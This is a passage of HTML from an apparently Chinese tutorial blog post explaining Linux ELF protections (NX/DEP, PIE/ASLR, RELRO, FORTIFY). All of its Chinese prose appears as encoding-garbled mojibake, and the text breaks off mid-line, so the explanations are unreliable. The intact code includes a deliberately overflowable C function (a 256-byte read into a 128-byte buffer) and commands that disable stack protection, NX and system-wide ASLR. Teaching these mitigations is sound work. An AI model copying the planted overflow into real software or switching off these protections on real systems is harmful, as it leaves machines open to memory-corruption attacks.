id="2-DEP-DataExecutionPrevention-NX-Non-executable-é˜²æŠ¤"><a href="#2-DEP-DataExecutionPrevention-NX-Non-executable-é˜²æŠ¤" class="headerlink" title="2.DEP(DataExecutionPrevention)/NX(Non-executable)é˜²æŠ¤"></a>2.DEP(DataExecutionPrevention)/NX(Non-executable)é˜²æŠ¤</h2><p>NXå³No-eXecuteï¼ˆä¸å¯æ‰§è¡Œï¼‰çš„æ„æ€ï¼ŒNX(DEPï¼‰çš„åŸºæœ¬åŸç†æ˜¯å°†æ•°æ®æ‰€åœ¨å†…å­˜é¡µæ ‡è¯†ä¸ºä¸å¯æ‰§è¡Œï¼Œå½“ç¨‹åºæº¢å‡ºæˆåŠŸè½¬å…¥shellcodeæ—¶ï¼Œç¨‹åºä¼šå°è¯•åœ¨æ•°æ®é¡µé¢ä¸Šæ‰§è¡ŒæŒ‡ä»¤ï¼Œæ­¤æ—¶CPUå°±ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œè€Œä¸æ˜¯å»æ‰§è¡Œæ¶æ„æŒ‡ä»¤ã€‚<br>æ­£å¸¸åœ¨æ ˆæº¢å‡ºæ—¶é€šè¿‡è·³è½¬æŒ‡ä»¤è·³è½¬è‡³shellcodeï¼Œä½†æ˜¯NXå¼€å¯åCPUä¼šå¯¹æ•°æ®åŒºåŸŸè¿›è¡Œæ£€æŸ¥ï¼Œå½“å‘ç°æ­£å¸¸ç¨‹åºä¸æ‰§è¡Œï¼Œå¹¶è·³è½¬è‡³å…¶ä»–åœ°å€åä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œæ¥ä¸‹æ¥ä¸ä¼šç»§ç»­æ‰§è¡Œshellcodeï¼Œè€Œæ˜¯å»è½¬å…¥å¼‚å¸¸å¤„ç†ï¼Œå¤„ç†åä¼šç¦æ­¢shellcodeç»§ç»­æ‰§è¡Œ</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gcc -o test test.c <span class="comment">// é»˜è®¤æƒ…å†µä¸‹ï¼Œå¼€å¯NXä¿æŠ¤</span></span><br><span class="line">gcc -z execstack -o test test.c <span class="comment">// ç¦ç”¨NXä¿æŠ¤</span></span><br><span class="line">gcc -z noexecstack -o test test.c <span class="comment">// å¼€å¯NXä¿æŠ¤</span></span><br><span class="line">-z execstack / -z <span class="title function_">noexecstack</span> <span class="params">(å…³é—­ / å¼€å¯)</span></span><br></pre></td></tr></table></figure><h3 id="ä¾‹"><a href="#ä¾‹" class="headerlink" title="ä¾‹"></a>ä¾‹</h3><p>è¯¥é˜²æŠ¤çš„ä½œç”¨ç®€å•çš„è¯´å°±æ˜¯èƒ½å†™çš„åœ°æ–¹ä¸èƒ½æ‰§è¡Œï¼Œèƒ½æ‰§è¡Œçš„åœ°æ–¹ä¸èƒ½å†™ã€‚<br>shellcode æ‰€å¡«å……çš„ä½ç½®æ˜¯åœ¨æ ˆä¸Šï¼Œä½†æ˜¯å¼€å¯äº† DEP ä¿æŠ¤åæ ˆä¸Šå°±æ²¡æœ‰æ‰§è¡Œçš„æƒé™ä¹Ÿå°±æ— æ³•æ§åˆ¶ç¨‹åºæµç¨‹ã€‚</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">undef</span> _FORTIFY_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vulnerable_function</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">char</span> buf[<span class="number">128</span>];</span><br><span class="line">read(STDIN_FILENO, buf, <span class="number">256</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span> &#123;</span><br><span class="line">vulnerable_function();</span><br><span class="line">write(STDOUT_FILENO, <span class="string">&quot;Hello, World\n&quot;</span>, <span class="number">13</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸å¼€å¯ DEP ä¿æŠ¤ç¼–è¯‘ï¼š<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc -fno-stack-protector -z execstack -o ret2lib ret2lib.c</span><br></pre></td></tr></table></figure><br>æŸ¥çœ‹æƒé™å‘½ä»¤ï¼š<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /proc/[pid]/maps</span><br></pre></td></tr></table></figure><br>ç¨‹åºè¿è¡Œåœ¨åå°å‘½ä»¤ï¼š<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./ret2lib &amp;</span><br></pre></td></tr></table></figure><br>æƒé™å¦‚ä¸‹ï¼š<img src="/2025/02/06/ELF%E6%96%87%E4%BB%B6%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/Pasted image 20250125140328.png" alt="Pasted image 20250125140328">å¼€å¯ DEP ä¿æŠ¤ç¼–è¯‘ï¼š<br><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc -fno-stack-protector -o ret2lib ret2lib.c</span><br></pre></td></tr></table></figure><br>æƒé™å¦‚ä¸‹ï¼š<br><img src="/2025/02/06/ELF%E6%96%87%E4%BB%B6%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/Pasted image 20250125140357.png" alt="Pasted image 20250125140357"><br>å¯ä»¥çœ‹åˆ°åœ¨å¼€å¯DEPé˜²æŠ¤çš„æƒ…å†µä¸‹æ ˆä¸Šé¢å°±æ²¡æœ‰æ‰§è¡Œæƒé™äº†ã€‚</p><h2 id="3-PIEï¼ˆASLRï¼‰"><a href="#3-PIEï¼ˆASLRï¼‰" class="headerlink" title="3.PIEï¼ˆASLRï¼‰"></a>3.PIEï¼ˆASLRï¼‰</h2><p>ä¸€èˆ¬æƒ…å†µä¸‹NXï¼ˆWindowså¹³å°ä¸Šç§°ä¸ºDEPï¼‰å’Œåœ°å€ç©ºé—´åˆ†å¸ƒéšæœºåŒ–ï¼ˆASLRï¼‰ä¼šåŒæ—¶å·¥ä½œã€‚å†…å­˜åœ°å€éšæœºåŒ–æœºåˆ¶æœ‰ä¸‰ç§æƒ…å†µ</p><blockquote><p>0 - è¡¨ç¤ºå…³é—­è¿›ç¨‹åœ°å€éšæœºåŒ–<br>1 - è¡¨ç¤ºå°†mmapçš„åŸºåœ°å€ï¼Œæ ˆåŸºåœ°å€å’Œ.soåœ°å€éšæœºåŒ–<br>2 - è¡¨ç¤ºåœ¨1çš„åŸºç¡€ä¸Šå¢åŠ heapçš„åœ°å€éšæœºåŒ–</p></blockquote><p><em>è¯¥ä¿æŠ¤èƒ½ä½¿æ¯æ¬¡è¿è¡Œçš„ç¨‹åºçš„åœ°å€éƒ½ä¸åŒï¼Œé˜²æ­¢æ ¹æ®å›ºå®šåœ°å€æ¥å†™expæ‰§è¡Œæ”»å‡»</em></p><blockquote><p>å¯ä»¥é˜²æ­¢Ret2libcæ–¹å¼é’ˆå¯¹DEPçš„æ”»å‡»ã€‚ASLRå’ŒDEPé…åˆä½¿ç”¨ï¼Œèƒ½æœ‰æ•ˆé˜»æ­¢æ”»å‡»è€…åœ¨å †æ ˆä¸Šè¿è¡Œæ¶æ„ä»£ç </p></blockquote><p>Linuxä¸‹å…³é—­PIEçš„å‘½ä»¤ï¼š<br><code>sudo -s echo 0 &gt; /proc/sys/kernel/randomize_va_space</code><br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">gcc -o test test.c <span class="comment">// é»˜è®¤æƒ…å†µä¸‹ï¼Œä¸å¼€å¯PIE</span></span><br><span class="line">gcc -fpie -pie -o test test.c <span class="comment">// å¼€å¯PIEï¼Œæ­¤æ—¶å¼ºåº¦ä¸º1</span></span><br><span class="line">gcc -fPIE -pie -o test test.c <span class="comment">// å¼€å¯PIEï¼Œæ­¤æ—¶ä¸ºæœ€é«˜å¼ºåº¦2</span></span><br><span class="line">gcc -fpic -o test test.c <span class="comment">// å¼€å¯PICï¼Œæ­¤æ—¶å¼ºåº¦ä¸º1ï¼Œä¸ä¼šå¼€å¯PIE</span></span><br><span class="line">gcc -fPIC -o test test.c <span class="comment">// å¼€å¯PICï¼Œæ­¤æ—¶ä¸ºæœ€é«˜å¼ºåº¦2ï¼Œä¸ä¼šå¼€å¯PIE</span></span><br><span class="line">-no-pie / -pie (å…³é—­ / å¼€å¯)</span><br></pre></td></tr></table></figure></p><h3 id="èƒŒæ™¯çŸ¥è¯†"><a href="#èƒŒæ™¯çŸ¥è¯†" class="headerlink" title="èƒŒæ™¯çŸ¥è¯†"></a>èƒŒæ™¯çŸ¥è¯†</h3><p>ASLR(Address Space Layout Randomization)åœ¨2005å¹´è¢«å¼•å…¥åˆ°Linuxçš„å†…æ ¸ kernel 2.6.12 ä¸­ï¼Œå½“ç„¶æ—©åœ¨2004å¹´å°±ä»¥patchçš„å½¢å¼è¢«å¼•å…¥ã€‚<em>éšç€å†…å­˜åœ°å€çš„éšæœºåŒ–ï¼Œä½¿å¾—å“åº”çš„åº”ç”¨å˜å¾—éšæœºã€‚è¿™æ„å‘³ç€åŒä¸€åº”ç”¨å¤šæ¬¡æ‰§è¡Œæ‰€ä½¿ç”¨å†…å­˜ç©ºé—´å®Œå…¨ä¸åŒï¼Œä¹Ÿæ„å‘³ç€ç®€å•çš„ç¼“å†²åŒºæº¢å‡ºæ”»å‡»æ— æ³•è¾¾åˆ°ç›®çš„ã€‚</em><br>GDBä»ç‰ˆæœ¬7å¼€å§‹ï¼Œç¬¬ä¸€æ¬¡åœ¨Ubuntu 9.10ï¼ˆKarmicï¼‰ä¸Šï¼Œè¢«è°ƒè¯•çš„ç¨‹åºå¯ä»¥è¢«å…³é—­ASLRï¼ˆé€šè¿‡æ ‡è®°ä½ADDR_NO_RANDOMIZE ï¼‰ã€‚</p><blockquote><p>Ubuntu 9.10çš„ç‰ˆæœ¬æ§åˆ¶ASLRçš„æ–¹æ³•è¿˜ä¸æˆç†Ÿï¼Œéœ€è¦ä»æºç å±‚é¢ç¡®è®¤æ˜¯å¦å¯ä»¥å…³é—­å¼€å¯ã€‚</p><h3 id="æŸ¥çœ‹ASLRè®¾ç½®"><a href="#æŸ¥çœ‹ASLRè®¾ç½®" class="headerlink" title="æŸ¥çœ‹ASLRè®¾ç½®"></a>æŸ¥çœ‹ASLRè®¾ç½®</h3><p>æŸ¥çœ‹å½“å‰æ“ä½œç³»ç»Ÿçš„ASLRé…ç½®æƒ…å†µï¼Œä¸¤ç§å‘½ä»¤<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> /proc/sys/kernel/randomize_va_space</span></span><br><span class="line">2</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sysctl -a --pattern randomize</span></span><br><span class="line">kernel.randomize_va_space = 2</span><br></pre></td></tr></table></figure></p><h3 id="é…ç½®é€‰é¡¹"><a href="#é…ç½®é€‰é¡¹" class="headerlink" title="é…ç½®é€‰é¡¹"></a>é…ç½®é€‰é¡¹</h3><ul><li>0 = å…³é—­</li><li>1 = åŠéšæœºã€‚å…±äº«åº“ã€æ ˆã€mmap() ä»¥åŠ VDSO å°†è¢«éšæœºåŒ–ã€‚ï¼ˆç•™å‘ï¼ŒPIEä¼šå½±å“heapçš„éšæœºåŒ–ã€‚ã€‚ï¼‰</li><li>2 = å…¨éšæœºã€‚é™¤äº†1ä¸­æ‰€è¿°ï¼Œè¿˜æœ‰heapã€‚<br>åé¢ä¼šè¯¦ç»†ä»‹ç»ASLRçš„ç»„æˆï¼Œä¸å…³å¿ƒçš„åŒå­¦å¯ä»¥ç®€å•ç†è§£ä¸ºASLRä¸æ˜¯ä¸€ä¸ªç¬¼ç»Ÿçš„æ¦‚å¿µï¼Œè€Œæ˜¯è¦æŒ‰æ¨¡å—å•ç‹¬å®ç°çš„ã€‚å½“ç„¶ï¼Œåœ¨æ”»é˜²å¯¹æŠ—çš„è§’åº¦ä¸Šï¼Œåº”ä¸ºä¸æ˜¯æ‰€æœ‰ç»„ä»¶éƒ½ä¼šéšæœºï¼Œæ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥æŒ‰å›¾ç´¢éª¥ï¼Œå†™å‡ºé€šç”¨çš„shellcodeè°ƒç”¨ç³»ç»Ÿåº“ã€‚<h3 id="æŸ¥çœ‹åœ°å€ç©ºé—´éšæœºæ•ˆæœ"><a href="#æŸ¥çœ‹åœ°å€ç©ºé—´éšæœºæ•ˆæœ" class="headerlink" title="æŸ¥çœ‹åœ°å€ç©ºé—´éšæœºæ•ˆæœ"></a>æŸ¥çœ‹åœ°å€ç©ºé—´éšæœºæ•ˆæœ</h3>ä½¿ç”¨lddå‘½ä»¤å°±å¯ä»¥è§‚å¯Ÿåˆ°ç¨‹åºæ‰€ä¾èµ–åŠ¨æ€åŠ è½½æ¨¡å—çš„åœ°å€ç©ºé—´ï¼Œå¦‚ä¸‹ä¸‹å›¾æ‰€ç¤ºï¼Œè¢«æ‹¬å·åŒ…è£¹ã€‚åœ¨shellä¸­ï¼Œè¿è¡Œä¸¤æ¬¡ç›¸åŒçš„lddå‘½ä»¤ï¼Œå³å¯å¯¹æ¯”å‡ºå‰ååœ°å€çš„ä¸åŒä¹‹å¤„ï¼Œå½“ç„¶ï¼ŒASLRå¼€å¯æ—¶æ‰ä¼šå˜åŒ–ï¼š<br><img src="/2025/02/06/ELF%E6%96%87%E4%BB%B6%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/Pasted image 20250121141533.png" alt="Pasted image 20250121141533"><br><strong>ASLRå¼€å¯æ—¶ï¼ŒåŠ¨æ€åº“çš„åŠ è½½åœ°å€ä¸åŒ</strong></li></ul></blockquote><p><img src="/2025/02/06/ELF%E6%96%87%E4%BB%B6%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/Pasted image 20250121141548.png" alt="Pasted image 20250121141548"><br><strong>ASLRå…³é—­æ—¶ï¼ŒåŠ¨æ€åº“çš„åŠ è½½åœ°å€ç›¸åŒ</strong></p><h4 id="å…³é—­ASLR"><a href="#å…³é—­ASLR" class="headerlink" title="å…³é—­ASLR"></a>å…³é—­ASLR</h4><h5 id="æ–¹æ³•ä¸€ï¼š-æ‰‹åŠ¨ä¿®æ”¹randomize-va-spaceæ–‡ä»¶"><a href="#æ–¹æ³•ä¸€ï¼š-æ‰‹åŠ¨ä¿®æ”¹randomize-va-spaceæ–‡ä»¶" class="headerlink" title="æ–¹æ³•ä¸€ï¼š æ‰‹åŠ¨ä¿®æ”¹randomize_va_spaceæ–‡ä»¶"></a>æ–¹æ³•ä¸€ï¼š æ‰‹åŠ¨ä¿®æ”¹randomize_va_spaceæ–‡ä»¶</h5><p>è¯šå¦‚ä¸Šé¢ä»‹ç»çš„randomize_va_spaceæ–‡ä»¶çš„æšä¸¾å€¼å«ä¹‰ï¼Œè®¾ç½®çš„å€¼ä¸åŒï¼Œlinuxå†…æ ¸åŠ è½½ç¨‹åºçš„åœ°å€ç©ºé—´çš„ç­–ç•¥å°±ä¼šä¸åŒã€‚æ¯”è¾ƒç®€å•æ˜äº†ã€‚è¿™é‡Œ0ä»£è¡¨å…³é—­ASLRã€‚<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span></span><br></pre></td></tr></table></figure><br>æ³¨æ„ï¼Œè¿™é‡Œæ˜¯å…ˆè¿›rootæƒé™ï¼Œåæ‰§è¡Œã€‚ä¸è¦é—®ä¸ºä»€ä¹ˆsudo echo 0 &gt; /proc/sys/kernel/randomize_va_spaceä¸ºä»€ä¹ˆä¼šæŠ¥é”™</p><h5 id="æ–¹æ³•äºŒï¼š-ä½¿ç”¨sysctlæ§åˆ¶ASLR"><a href="#æ–¹æ³•äºŒï¼š-ä½¿ç”¨sysctlæ§åˆ¶ASLR" class="headerlink" title="æ–¹æ³•äºŒï¼š ä½¿ç”¨sysctlæ§åˆ¶ASLR"></a>æ–¹æ³•äºŒï¼š ä½¿ç”¨sysctlæ§åˆ¶ASLR</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sysctl -w kernel.randomize_va_space=0</span></span><br></pre></td></tr></table></figure><p>è¿™æ˜¯ä¸€ç§ä¸´æ—¶æ”¹å˜éšæœºç­–ç•¥çš„æ–¹æ³•ï¼Œé‡å¯ä¹‹åå°†æ¢å¤é»˜è®¤ã€‚å¦‚æœéœ€è¦æ°¸ä¹…ä¿å­˜é…ç½®ï¼Œéœ€è¦åœ¨é…ç½®æ–‡ä»¶ /etc/sysctl.conf ä¸­å¢åŠ è¿™ä¸ªé€‰é¡¹ã€‚</p><h5 id="æ–¹æ³•ä¸‰ï¼š-ä½¿ç”¨setarchæ§åˆ¶å•ä¸ªç¨‹åºçš„éšæœºåŒ–"><a href="#æ–¹æ³•ä¸‰ï¼š-ä½¿ç”¨setarchæ§åˆ¶å•ä¸ªç¨‹åºçš„éšæœºåŒ–" class="headerlink" title="æ–¹æ³•ä¸‰ï¼š ä½¿ç”¨setarchæ§åˆ¶å•ä¸ªç¨‹åºçš„éšæœºåŒ–"></a>æ–¹æ³•ä¸‰ï¼š ä½¿ç”¨setarchæ§åˆ¶å•ä¸ªç¨‹åºçš„éšæœºåŒ–</h5><p>å¦‚æœä½ æƒ³å†å²å…³é—­å•ä¸ªç¨‹åºçš„ASLRï¼Œä½¿ç”¨setarchæ˜¯å¾ˆå¥½çš„é€‰æ‹©ã€‚setarchå‘½ä»¤å¦‚å…¶åï¼Œæ”¹å˜ç¨‹åºçš„è¿è¡Œæ¶æ„ç¯å¢ƒï¼Œå¹¶å¯ä»¥è‡ªå®šä¹‰ç¯å¢ƒflagã€‚<br><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">setarch `uname -m` -R ./your_program</span><br></pre></td></tr></table></figure><br>-Rå‚æ•°ä»£è¡¨å…³é—­åœ°å€ç©ºé—´éšæœºåŒ–ï¼ˆå¼€å¯ADDR_NO_RANDOMIZE)</p><h5 id="æ–¹æ³•å››ï¼š-åœ¨GDBåœºæ™¯ä¸‹ï¼Œä½¿ç”¨set-disable-randomization-off"><a href="#æ–¹æ³•å››ï¼š-åœ¨GDBåœºæ™¯ä¸‹ï¼Œä½¿ç”¨set-disable-randomization-off" class="headerlink" title="æ–¹æ³•å››ï¼š åœ¨GDBåœºæ™¯ä¸‹ï¼Œä½¿ç”¨set disable-randomization off"></a>æ–¹æ³•å››ï¼š åœ¨GDBåœºæ™¯ä¸‹ï¼Œä½¿ç”¨set disable-randomization off</h5><p>åœ¨è°ƒè¯•ç‰¹å®šç¨‹åºæ—¶ï¼Œå¯ä»¥é€šè¿‡set disable-randomizationå‘½ä»¤å¼€å¯æˆ–è€…å…³é—­åœ°å€ç©ºé—´éšæœºåŒ–ã€‚é»˜è®¤æ˜¯å…³é—­éšæœºåŒ–çš„ï¼Œä¹Ÿå°±æ˜¯onçŠ¶æ€ã€‚<br>å½“ç„¶ï¼Œè¿™é‡Œå¼€å¯ï¼Œå…³é—­å’ŒæŸ¥çœ‹çš„æ–¹æ³•çœ‹èµ·æ¥å°±æ¯”è¾ƒæ­£è§„äº†ã€‚<br>å…³é—­ASLRï¼š<br><code>set disable-randomization on</code><br>å¼€å¯ASLRï¼š<br><code>set disable-randomization off</code><br>æŸ¥çœ‹ASLRçŠ¶æ€ï¼š<br><code>show disable-randomization</code></p><h3 id="ASLRä¸PIEçš„åŒºåˆ«"><a href="#ASLRä¸PIEçš„åŒºåˆ«" class="headerlink" title="ASLRä¸PIEçš„åŒºåˆ«"></a>ASLRä¸PIEçš„åŒºåˆ«</h3><p>é¦–å…ˆï¼ŒASLRçš„æ˜¯æ“ä½œç³»ç»Ÿçš„åŠŸèƒ½é€‰é¡¹ï¼Œä½œç”¨äºexecutableï¼ˆELFï¼‰è£…å…¥å†…å­˜è¿è¡Œæ—¶ï¼Œå› è€Œåªèƒ½éšæœºåŒ–stackã€heapã€librariesçš„åŸºå€ï¼›è€ŒPIEï¼ˆPosition Independent Executablesï¼‰æ˜¯ç¼–è¯‘å™¨ï¼ˆgccï¼Œ..ï¼‰åŠŸèƒ½é€‰é¡¹ï¼ˆ-fPIEï¼‰ï¼Œä½œç”¨äºexcutableç¼–è¯‘è¿‡ç¨‹ï¼Œå¯å°†å…¶ç†è§£ä¸ºç‰¹æ®Šçš„PICï¼ˆsoä¸“ç”¨ï¼ŒPosition Independent Codeï¼‰ï¼ŒåŠ äº†PIEé€‰é¡¹ç¼–è¯‘å‡ºæ¥çš„ELFç”¨fileå‘½ä»¤æŸ¥çœ‹ä¼šæ˜¾ç¤ºå…¶ä¸ºsoï¼Œå…¶éšæœºåŒ–äº†ELFè£…è½½å†…å­˜çš„åŸºå€ï¼ˆä»£ç æ®µã€pltã€gotã€dataç­‰å…±åŒçš„åŸºå€ï¼‰ã€‚<br>å…¶æ¬¡ï¼ŒASLRæ—©äºPIEå‡ºç°ï¼Œæ‰€ä»¥æœ‰return-to-pltã€got hijackã€stack-pivot(bypass stack ransomize)ç­‰ç»•è¿‡ASLRçš„æŠ€æœ¯ï¼›è€Œåœ¨ASLR+PIEä¹‹åï¼Œè¿™äº›bypassæŠ€æœ¯å°±éƒ½å¤±æ•ˆäº†ï¼Œåªèƒ½å€ŸåŠ©å…¶ä»–çš„ä¿¡æ¯æ³„éœ²æ¼æ´æ³„éœ²åŸºå€ï¼ˆå¸¸ç”¨libcåŸºå€ï¼‰ã€‚<br>æœ€åï¼ŒASLRæœ‰0/1/2ä¸‰ç§çº§åˆ«ï¼Œå…¶ä¸­0è¡¨ç¤ºASLRæœªå¼€å¯ï¼Œ1è¡¨ç¤ºéšæœºåŒ–stackã€librariesï¼Œ2è¿˜ä¼šéšæœºåŒ–heapã€‚</p><blockquote><p>ASLR ä¸è´Ÿè´£ä»£ç æ®µä»¥åŠæ•°æ®æ®µçš„éšæœºåŒ–å·¥ä½œï¼Œè¿™é¡¹å·¥ä½œç”± PIE è´Ÿè´£ã€‚ä½†æ˜¯åªæœ‰åœ¨å¼€å¯ ASLR ä¹‹åï¼ŒPIE æ‰ä¼šç”Ÿæ•ˆã€‚</p></blockquote><h2 id="4-RELRO"><a href="#4-RELRO" class="headerlink" title="4.RELRO"></a>4.RELRO</h2><p>Relocation Read-Only(RELRO)å¯ä»¥ä½¿ç¨‹åºæŸäº›éƒ¨åˆ†æˆä¸ºåªè¯»çš„ã€‚å®ƒåˆ†ä¸ºä¸¤ç§:Partial RELROå’ŒFull RELROï¼Œå³:éƒ¨åˆ†RELROå’Œå®Œå…¨RELROã€‚<br><em>éƒ¨åˆ†RELRO</em>æ˜¯GCCçš„é»˜è®¤è®¾ç½®ï¼Œå‡ ä¹æ‰€æœ‰çš„äºŒè¿›åˆ¶æ–‡ä»¶éƒ½è‡³å°‘ä½¿ç”¨éƒ¨åˆ†RELROã€‚è¿™æ ·ä»…ä»…åªèƒ½é˜²æ­¢å…¨å±€å˜é‡ä¸Šçš„ç¼“å†²åŒºæº¢å‡ºä»è€Œè¦†ç›–GOTã€‚<br><em>å®Œå…¨RELRO</em>ä½¿æ•´ä¸ªGOTåªè¯»ï¼Œä»è€Œæ— æ³•è¢«è¦†ç›–ï¼Œä½†è¿™æ ·ä¼šå¤§å¤§å¢åŠ ç¨‹åºçš„å¯åŠ¨æ—¶é—´ï¼Œå› ä¸ºç¨‹åºåœ¨å¯åŠ¨ä¹‹å‰éœ€è¦è§£ææ‰€æœ‰çš„ç¬¦å·ã€‚</p><blockquote><p>åœ¨Linuxç³»ç»Ÿå®‰å…¨é¢†åŸŸæ•°æ®å¯ä»¥å†™çš„å­˜å‚¨åŒºå°±ä¼šæ˜¯æ”»å‡»çš„ç›®æ ‡ï¼Œå°¤å…¶æ˜¯å­˜å‚¨å‡½æ•°æŒ‡é’ˆçš„åŒºåŸŸã€‚æ‰€ä»¥åœ¨å®‰å…¨é˜²æŠ¤çš„è§’åº¦åº”å°½é‡å‡å°‘å¯å†™çš„å­˜å‚¨åŒºåŸŸ</p><h2 id="RELROä¼šè®¾ç½®ç¬¦å·é‡å®šå‘è¡¨æ ¼ä¸ºåªè¯»æˆ–è€…ç¨‹åºå¯åŠ¨æ—¶å°±è§£æå¹¶ç»‘å®šæ‰€æœ‰åŠ¨æ€ç¬¦å·ï¼Œä»è€Œå‡å°‘å¯¹GOTè¡¨çš„æ”»å‡»ã€‚å¦‚æœRELROä¸ºPartial-RELROï¼Œå°±è¯´æ˜å¯¹GOTè¡¨å…·æœ‰å†™æƒé™"><a href="#RELROä¼šè®¾ç½®ç¬¦å·é‡å®šå‘è¡¨æ ¼ä¸ºåªè¯»æˆ–è€…ç¨‹åºå¯åŠ¨æ—¶å°±è§£æå¹¶ç»‘å®šæ‰€æœ‰åŠ¨æ€ç¬¦å·ï¼Œä»è€Œå‡å°‘å¯¹GOTè¡¨çš„æ”»å‡»ã€‚å¦‚æœRELROä¸ºPartial-RELROï¼Œå°±è¯´æ˜å¯¹GOTè¡¨å…·æœ‰å†™æƒé™" class="headerlink" title="RELROä¼šè®¾ç½®ç¬¦å·é‡å®šå‘è¡¨æ ¼ä¸ºåªè¯»æˆ–è€…ç¨‹åºå¯åŠ¨æ—¶å°±è§£æå¹¶ç»‘å®šæ‰€æœ‰åŠ¨æ€ç¬¦å·ï¼Œä»è€Œå‡å°‘å¯¹GOTè¡¨çš„æ”»å‡»ã€‚å¦‚æœRELROä¸ºPartial RELROï¼Œå°±è¯´æ˜å¯¹GOTè¡¨å…·æœ‰å†™æƒé™"></a>RELROä¼šè®¾ç½®ç¬¦å·é‡å®šå‘è¡¨æ ¼ä¸ºåªè¯»æˆ–è€…ç¨‹åºå¯åŠ¨æ—¶å°±è§£æå¹¶ç»‘å®šæ‰€æœ‰åŠ¨æ€ç¬¦å·ï¼Œä»è€Œå‡å°‘å¯¹GOTè¡¨çš„æ”»å‡»ã€‚å¦‚æœRELROä¸ºPartial RELROï¼Œå°±è¯´æ˜å¯¹GOTè¡¨å…·æœ‰å†™æƒé™</h2><p>ä¸»è¦ç”¨æ¥ä¿æŠ¤é‡å®šä½è¡¨æ®µå¯¹åº”æ•°æ®åŒºåŸŸï¼Œé»˜è®¤å¯å†™<br>Partial RELRO: .gotä¸å¯å†™ï¼Œgot.pItå¯å†™<br>Full RELRO: .gotå’Œgot.pItä¸å¯å†™<br>got.pltå¯ä»¥ç®€ç§°ä¸ºgotè¡¨</p></blockquote><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//GCCç”¨æ³•</span></span><br><span class="line">gcc -o test test.c <span class="comment">// é»˜è®¤æƒ…å†µä¸‹ï¼Œæ˜¯Partial RELRO</span></span><br><span class="line">gcc -z norelro -o test test.c <span class="comment">// å…³é—­ï¼Œå³No RELRO</span></span><br><span class="line">gcc -z lazy -o test test.c <span class="comment">// éƒ¨åˆ†å¼€å¯ï¼Œå³Partial RELRO</span></span><br><span class="line">gcc -z now -o test test.c <span class="comment">// å…¨éƒ¨å¼€å¯</span></span><br><span class="line">-z norelro / -z lazy / -z <span class="title function_">now</span> <span class="params">(å…³é—­ / éƒ¨åˆ†å¼€å¯ / å®Œå…¨å¼€å¯)</span></span><br></pre></td></tr></table></figure><h2 id="ç¼–å¤–-FORTIFY"><a href="#ç¼–å¤–-FORTIFY" class="headerlink" title="ç¼–å¤–:FORTIFY"></a>ç¼–å¤–:FORTIFY</h2><p>fortifyæ˜¯è½»å¾®çš„æ£€æŸ¥ï¼Œç”¨äºæ£€æŸ¥æ˜¯å¦å­˜åœ¨ç¼“å†²åŒºæº¢å‡ºçš„é”™è¯¯ã€‚é€‚ç”¨äºç¨‹åºé‡‡ç”¨å¤§é‡çš„å­—ç¬¦ä¸²æˆ–è€…å†…å­˜æ“ä½œå‡½æ•°ï¼Œå¦‚:<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; <span class="built_in">memcpy</span>():</span><br><span class="line">æè¿°ï¼š<span class="type">void</span> *<span class="title function_">memcpy</span><span class="params">(<span class="type">void</span> *str1, <span class="type">const</span> <span class="type">void</span> *str2, <span class="type">size_t</span> n)</span></span><br><span class="line">     ä»å­˜å‚¨åŒºstr2å¤åˆ¶nä¸ªå­—ç¬¦åˆ°å­˜å‚¨åŒºstr1</span><br><span class="line">  å‚æ•°ï¼šstr1 -- æŒ‡å‘ç”¨äºå­˜å‚¨å¤åˆ¶å†…å®¹çš„ç›®æ ‡æ•°ç»„ï¼Œç±»å‹å¼ºåˆ¶è½¬æ¢ä¸º <span class="type">void</span>* æŒ‡é’ˆ</span><br><span class="line">     str2 -- æŒ‡å‘è¦å¤åˆ¶çš„æ•°æ®æºï¼Œç±»å‹å¼ºåˆ¶è½¬æ¢ä¸º <span class="type">void</span>* æŒ‡é’ˆ</span><br><span class="line">     n -- è¦è¢«å¤åˆ¶çš„å­—èŠ‚æ•°</span><br><span class="line">  è¿”å›å€¼ï¼šè¯¥å‡½æ•°è¿”å›ä¸€ä¸ªæŒ‡å‘ç›®æ ‡å­˜å‚¨åŒº str1 çš„æŒ‡é’ˆ</span><br><span class="line">---------------------------------------------------------------------------------------</span><br><span class="line">&gt;&gt;&gt; <span class="title function_">memset</span><span class="params">()</span>:</span><br><span class="line">  æè¿°ï¼š<span class="type">void</span> *<span 